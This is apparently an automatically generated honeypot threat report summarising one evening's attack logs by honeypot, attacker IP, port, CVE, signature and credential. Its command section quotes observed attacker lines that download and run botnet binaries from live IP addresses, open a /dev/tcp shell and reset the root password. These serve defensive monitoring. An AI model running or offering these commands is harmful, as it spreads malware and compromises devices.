
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-29T20:01:32Z
**Timeframe:** 2025-09-29T19:20:01Z to 2025-09-29T20:00:01Z

**Files Used:**
- agg_log_20250929T192001Z.json
- agg_log_20250929T194002Z.json
- agg_log_20250929T200001Z.json

## Executive Summary
This report summarizes 12,481 observed attacks. The most frequent attacks were logged by the Cowrie honeypot. A significant portion of the attacks originated from IP addresses 103.190.200.2 and 45.78.224.98. The most targeted port was TCP/445, indicating a high volume of SMB-related probes. Several CVEs were detected, with CVE-2002-0013 and CVE-2002-0012 being the most common. Attackers attempted various commands, including downloading and executing malicious files.

## Detailed Analysis

### Attacks by Honeypot
- Cowrie: 4751
- Suricata: 2932
- Honeytrap: 2639
- Ciscoasa: 1440
- Redishoneypot: 345
- Tanner: 97
- Dionaea: 83
- Mailoney: 67
- Adbhoney: 18
- ssh-rsa: 22
- ConPot: 23
- H0neytr4p: 18
- Sentrypeer: 16
- Honeyaml: 16
- ElasticPot: 8
- Dicompot: 6

### Top Attacking IPs
- 103.190.200.2: 1336
- 4.144.169.44: 1246
- 45.78.224.98: 1209
- 137.184.169.79: 1389
- 47.83.31.202: 429
- 185.156.73.167: 368
- 185.156.73.166: 373
- 92.63.197.55: 354
- 92.63.197.59: 338
- 103.86.180.10: 208

### Top Targeted Ports/Protocols
- TCP/445: 1335
- 22: 916
- 6379: 345
- 8333: 180
- 80: 85
- TCP/22: 59
- 25: 65
- 8888: 30
- 445: 24
- 23: 23

### Most Common CVEs
- CVE-2002-0013 CVE-2002-0012: 7
- CVE-2019-11500 CVE-2019-11500: 6
- CVE-2021-3449 CVE-2021-3449: 5
- CVE-1999-0265: 4
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 3
- CVE-2005-4050: 1
- CVE-1999-0183: 1

### Commands Attempted by Attackers
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; curl http://94.154.35.154/arm.urbotnetisass -O; chmod +x arm.urbotnetisass; ./arm.urbotnetisass android; ... (and similar)
- nohup bash -c \"exec 6<>/dev/tcp/...\"
- uname -s -v -n -r -m
- rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.44/w.sh; sh w.sh; ... (and similar)
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- cat /proc/cpuinfo | grep name | wc -l
- echo \"root:7GXvsQqJoZPh\"|chpasswd|bash
- C-ECHO
- uname -s -m

### Signatures Triggered
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1334
- 2024766: 1334
- ET DROP Dshield Block Listed Source group 1: 405
- 2402000: 405
- ET SCAN NMAP -sS window 1024: 223
- 2009582: 223
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 88
- 2023753: 88
- ET INFO Reserved Internal IP Traffic: 58
- 2002752: 58
- ET SCAN Potential SSH Scan: 40
- 2001219: 40

### Users / Login Attempts
- root/: 22
- a2billinguser/: 10
- a2billinguser/a2billinguser: 4
- foundry/foundry: 2
- test/abc123: 2
- root/Password123$: 2
- mysql/mysql123: 2
- testuser/testuser: 4
- root/toor: 2
- git/git123: 2
- root/rootroot: 2
- rancher/rancher: 2
- vin/vin123: 2
- stephano/stephano: 2
- stephano/stephano1: 2
- stephano/stephano123: 2
- stephano/stephano1234: 2
- stephano/stephano12345: 2

### Files Uploaded/Downloaded
- wget.sh;: 4
- arm.urbotnetisass;: 3
- arm.urbotnetisass: 3
- arm5.urbotnetisass;: 3
- arm5.urbotnetisass: 3
- arm6.urbotnetisass;: 3
- arm6.urbotnetisass: 3
- arm7.urbotnetisass;: 3
- arm7.urbotnetisass: 3
- x86_32.urbotnetisass;: 3
- x86_32.urbotnetisass: 3
- mips.urbotnetisass;: 3
- mips.urbotnetisass: 3
- mipsel.urbotnetisass;: 3
- mipsel.urbotnetisass: 3
- w.sh;: 1
- c.sh;: 1

### HTTP User-Agents
- N/A

### SSH Clients
- N/A

### SSH Servers
- N/A

### Top Attacker AS Organizations
- N/A

## Key Observations and Anomalies
- The high number of attacks on port TCP/445, coupled with the 'DoublePulsar' signature, strongly suggests automated worm-like activity attempting to exploit the EternalBlue vulnerability.
- Attackers are using sophisticated commands to download and execute malware, often using `nohup` and redirecting from `/dev/tcp` to remain persistent and covert.
- A wide variety of credentials are being attempted, indicating brute-force attacks against common services. The majority of these are default or weak passwords.
- The `urbotnetisass` malware family is being actively distributed.
- There is a noticeable overlap in attacking IPs across the different log files, suggesting persistent attackers.
